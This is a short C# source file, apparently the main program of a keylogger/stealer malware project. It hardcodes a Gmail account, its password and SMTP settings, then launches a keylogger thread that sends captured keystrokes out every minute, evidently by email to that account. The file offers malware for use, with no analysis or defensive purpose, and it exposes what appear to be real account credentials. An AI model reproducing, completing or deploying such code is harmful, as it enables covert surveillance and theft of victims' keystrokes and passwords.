using sub.Stealers;

namespace sub
{
    class Program
    {
        static void Main()
        {
            //There needs to be code here that parses the settings into
            //These fields, but for now here is some test data
            Settings.EmailAddress = "sexmongrel69@gmail.com";
            Settings.EmailPassword = "omglawls";
            Settings.SmtpAddress = "smtp.gmail.com";
            Settings.SmtpPort = 587;

            StealerThread logger = new StealerThread(new Keylogger());    
            logger.Start(1); //Starts a Keylogger that returns every 1 minute
        }
    }
}
